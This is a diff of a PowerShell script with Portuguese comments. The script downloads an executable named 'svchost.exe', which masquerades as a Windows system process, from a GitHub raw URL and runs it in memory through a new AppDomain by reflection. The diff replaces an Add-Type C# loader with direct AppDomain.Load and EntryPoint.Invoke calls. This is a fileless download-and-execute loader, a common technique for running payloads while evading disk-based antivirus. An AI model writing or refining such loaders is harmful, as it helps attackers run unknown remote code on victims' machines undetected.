@@ -5,22 +5,20 @@ $url = "https://github.com/bragaawy/pjl/raw/main/svchost.exe"
 $webClient = New-Object System.Net.WebClient
 $bytesDoExe = $webClient.DownloadData($url )
 
-# --- NOVA TÉCNICA DE CARREGAMENTO ---
-$codigoLoader = @"
-using System;
-using System.Reflection;
-using System.Threading;
+# --- TÉCNICA DE CARREGAMENTO CORRIGIDA ---
 
-public class Loader
-{
-    [STAThread]
-    public static void Executar(byte[] assemblyBytes)
-    {
-        AppDomain novoDominio = AppDomain.CreateDomain("DominioWPF");
-        novoDominio.ExecuteAssembly(assemblyBytes);
-    }
-}
-"@
+# 3. Cria um novo "mundo" (AppDomain) para nossa aplicação
+$novoDominio = [System.AppDomain]::CreateDomain("DominioWPF")
 
-Add-Type -TypeDefinition $codigoLoader -Language CSharp
-[Loader]::Executar($bytesDoExe)
+# 4. Carrega o nosso .exe (a partir dos bytes) DENTRO do novo domínio
+$assembly = $novoDominio.Load($bytesDoExe)
+
+# 5. Encontra o ponto de entrada (o método Main) do nosso .exe
+$entryPoint = $assembly.EntryPoint
+
+# 6. Invoca o ponto de entrada.
+#    O [STAThread] é crucial e é definido automaticamente para o EntryPoint de apps WPF.
+$entryPoint.Invoke($null, $null)
+
+# Opcional: Descarrega o AppDomain quando a janela fechar (limpeza)
+# [System.AppDomain]::Unload($novoDominio)
